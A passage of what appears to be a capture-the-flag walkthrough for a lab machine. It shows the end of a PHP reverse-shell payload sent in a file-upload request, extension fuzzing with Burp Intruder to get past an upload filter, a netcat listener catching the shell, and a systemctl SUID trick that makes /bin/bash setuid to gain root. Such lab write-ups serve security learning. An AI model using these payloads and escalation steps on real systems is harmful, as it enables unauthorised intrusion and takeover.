+</span></span><span style=display:flex><span>		$input <span style=color:#f92672>=</span> <span style=color:#a6e22e>fread</span>($pipes[<span style=color:#ae81ff>1</span>], $chunk_size);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ($debug) <span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;STDOUT: </span><span style=color:#e6db74>$input</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>fwrite</span>($sock, $input);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#75715e>// If we can read from the process&#39;s STDERR
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#75715e>// send data down tcp connection
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>	<span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>in_array</span>($pipes[<span style=color:#ae81ff>2</span>], $read_a)) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ($debug) <span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;STDERR READ&#34;</span>);
+</span></span><span style=display:flex><span>		$input <span style=color:#f92672>=</span> <span style=color:#a6e22e>fread</span>($pipes[<span style=color:#ae81ff>2</span>], $chunk_size);
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>if</span> ($debug) <span style=color:#a6e22e>printit</span>(<span style=color:#e6db74>&#34;STDERR: </span><span style=color:#e6db74>$input</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>fwrite</span>($sock, $input);
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>fclose</span>($sock);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>fclose</span>($pipes[<span style=color:#ae81ff>0</span>]);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>fclose</span>($pipes[<span style=color:#ae81ff>1</span>]);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>fclose</span>($pipes[<span style=color:#ae81ff>2</span>]);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>proc_close</span>($process);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Like print, but does nothing if we&#39;ve daemonised ourself
+</span></span></span><span style=display:flex><span><span style=color:#75715e>// (I can&#39;t figure out how to redirect STDOUT like a proper daemon)
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>printit</span> ($string) {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$daemon) {
+</span></span><span style=display:flex><span>		<span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>$string\n</span><span style=color:#e6db74>&#34;</span>;
+</span></span><span style=display:flex><span>	}
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010> 
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>-----------------------------7905088481562265153553597258
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Content-Disposition: form-data; name=&#34;submit&#34;
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Submit
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>-----------------------------7905088481562265153553597258--
+</span></span></span></code></pre></div><p>Send the request to the repeater and check the response. The response includes that php extension is not alllowed.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;index.php&#34;</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span> <span style=color:#a6e22e>enctype</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;multipart/form-data&#34;</span>&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>h3</span>&gt;Upload&lt;/<span style=color:#f92672>h3</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span>&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;btn btn-primary&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Submit&#34;</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>form</span>&gt;
+</span></span><span style=display:flex><span>    Extension not allowed
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
+</span></span></code></pre></div><p>Send the request to intruder and in payload positions, select attack type as sniper and add ‘§’ to the file extension php.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>Content</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Disposition</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>form</span><span style=color:#f92672>-</span><span style=color:#a6e22e>data</span>; <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;file&#34;</span>; <span style=color:#a6e22e>filename</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;php-reverse-shell.§php§&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Content</span><span style=color:#f92672>-</span><span style=color:#a6e22e>Type</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>application</span><span style=color:#f92672>/</span><span style=color:#a6e22e>x</span><span style=color:#f92672>-</span><span style=color:#a6e22e>php</span>
+</span></span></code></pre></div><p>Go to payload options, add the
+extensions php, php3, php4. php5, phtml and start the attack.</p><p>After the attack was completed, we can see the results. In that sort by length and the length for phtml is 723 and for the rest of them 737. Also, for confirming
+that it was the correct file type allowed, check the response.</p><p>Now, edit the file extension of the php file we created to phtml.</p><p>Upload the file, and in another terminal start a netcat listener.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nc -lnvp <span style=color:#ae81ff>4444</span>
+</span></span></code></pre></div><p>The file is uploaded into the uploads directory. In the browser, access the file we uploaded which will be present in the path.</p><blockquote><p>http://10.10.118.9:3333/internal/uploads/php_reverse_shell.phtml</p></blockquote><p>After file is accessed, we get a reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>❯ nc -lnvp <span style=color:#ae81ff>4444</span>
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>4444</span> ...
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.6.10.164<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.118.9<span style=color:#f92672>]</span> <span style=color:#ae81ff>60722</span>
+</span></span><span style=display:flex><span>Linux vulnuniversity 4.4.0-142-generic <span style=color:#75715e>#168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style=display:flex><span> 17:43:51 up  1:23,  <span style=color:#ae81ff>0</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span style=display:flex><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>/bin/sh: 0: can<span style=color:#960050;background-color:#1e0010>&#39;</span>t access tty; job control turned off
+</span></span><span style=display:flex><span>$ 
+</span></span></code></pre></div><p>Now that we&rsquo;ve got a shell, we need to stabilize the shell as it is unstable.</p><p>Run the command to spawn a tty shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span></code></pre></div><p>Now hit ctrl+z to background it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Ctrl + Z
+</span></span></code></pre></div><p>Set the terminal to raw mode and disables echoing of input characters and foreground the process.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>stty raw -echo <span style=color:#f92672>&amp;&amp;</span> fg
+</span></span></code></pre></div><p>Set the terminal variable.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>export TERM<span style=color:#f92672>=</span>xterm
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ python -c <span style=color:#e6db74>&#34;import pty; pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</span></span><span style=display:flex><span>www-data@vulnuniversity:/$ ^Z
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>  + <span style=color:#ae81ff>29347</span> suspended  nc -lnvp <span style=color:#ae81ff>4444</span>
+</span></span><span style=display:flex><span>❯ stty raw -echo <span style=color:#f92672>&amp;&amp;</span> fg
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>  + <span style=color:#ae81ff>29347</span> continued  nc -lnvp <span style=color:#ae81ff>4444</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>www-data@vulnuniversity:/$ export TERM<span style=color:#f92672>=</span>xterm
+</span></span><span style=display:flex><span>www-data@vulnuniversity:/$ 
+</span></span></code></pre></div><h1 id=privilege-escalation>Privilege Escalation
+<a class=anchor href=#privilege-escalation>#</a></h1><p>Now run to find SUID files with root permission.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>find / -user root -perm -4000 -exec ls -ldb <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span>
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>40128</span> May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2017</span> /bin/su
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>142032</span> Jan <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2017</span> /bin/ntfs-3g
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>40152</span> May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2018</span> /bin/mount
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44680</span> May  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2014</span> /bin/ping6
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>27608</span> May <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2018</span> /bin/umount
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>659856</span> Feb <span style=color:#ae81ff>13</span>  <span style=color:#ae81ff>2019</span> /bin/systemctl
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44168</span> May  <span style=color:#ae81ff>7</span>  <span style=color:#ae81ff>2014</span> /bin/ping
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>30800</span> Jul <span style=color:#ae81ff>12</span>  <span style=color:#ae81ff>2016</span> /bin/fusermount
+</span></span></code></pre></div><p>We found some interesting files. Of them, /bin/systemctl is running as root.</p><p>We will follow as mentioned in the following resource to get elevated priveleges.</p><blockquote><p><a href=https://gtfobins.github.io/gtfobins/systemctl/#suid>https://gtfobins.github.io/gtfobins/systemctl/#suid</a>.</p></blockquote><p>We will try to follow that to get the root shell. Instead of using the default one <code>/bin/sh -c "id > /tmp/output"</code>, we need to get a shell. So, we use this <code>/bin/sh -c "chmod +s /bin/bash"</code> instead of that.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>TF<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp<span style=color:#66d9ef>)</span>.service
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#39;[Service]
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Type=oneshot
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>[Install]
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>WantedBy=multi-user.target&#39;</span> &gt; $TF
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>./systemctl link $TF
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>./systemctl enable --now $TF
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>www-data@vulnuniversity:/$ TF<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp<span style=color:#66d9ef>)</span>.service
+</span></span><span style=display:flex><span>www-data@vulnuniversity:/$ echo <span style=color:#e6db74>&#39;[Service]
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt; Type=oneshot
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt; ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt; [Install]
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&gt; WantedBy=multi-user.target&#39;</span> &gt; $TF
+</span></span><span style=display:flex><span>www-data@vulnuniversity:/$ /bin/systemctl link $TF
+</span></span><span style=display:flex><span>Created symlink from /etc/systemd/system/tmp.UnoAvXlPum.service to /tmp/tmp.UnoAvXlPum.service.
+</span></span><span style=display:flex><span>www-data@vulnuniversity:/$ /bin/systemctl enable --now $TF
+</span></span><span style=display:flex><span>Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.UnoAvXlPum.service to /tmp/tmp.UnoAvXlPum.service.
+</span></span><span style=display:flex><span>www-data@vulnuniversity:/$ bash -p
+</span></span><span style=display:flex><span>bash-4.3# id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> egid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>,33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>bash-4.3# cd /root
+</span></span><span style=display:flex><span>bash-4.3# ls
+</span></span><span style=display:flex><span>root.txt
+</span></span><span style=display:flex><span>bash-4.3# 
+</span></span></code></pre></div><p>We are root!!!</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#exploitation>Exploitation</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></div></aside></main></body></html>
